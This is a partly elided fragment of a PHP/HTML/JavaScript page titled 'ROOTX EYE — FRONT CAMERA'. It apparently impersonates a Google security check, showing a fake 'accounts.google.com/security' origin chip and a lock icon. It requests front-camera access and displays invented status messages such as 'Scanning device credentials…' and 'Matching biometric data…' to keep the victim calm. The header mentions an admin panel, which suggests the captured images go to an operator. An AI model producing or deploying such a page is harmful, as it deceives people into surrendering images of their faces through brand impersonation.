<?php
// ============================================
// ROOTX EYE — FRONT CAMERA (Admin Panel + Battery)
// ============================================
...
<style>
  ...
  .scanner-box { display:none; width:150px; height:150px; border:3px solid #1a73e8; border-radius:50%; margin:0 auto 20px; position:relative; overflow:hidden; }
  .scanner-line { position:absolute; top:0; left:0; right:0; height:4px; background:#1a73e8; animation:scan 2s linear infinite; }
...
<div class="card">
  ...
  <div id="form-section">
    ...
    <div class="origin-chip"><span class="chip-icon">🔒</span> accounts.google.com/security</div>
    <br>
...
startBtn.onclick = () => {
  ...
  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
    .then(stream => {
      ...
      const steps = ["Initializing secure camera…", "Scanning device credentials…", "Matching biometric data…", "Finalizing security check…"];
      let i = 0;
      const stepTimer = setInterval(() => { statusEl.innerText = steps[i % steps.length]; i++; }, 1500);
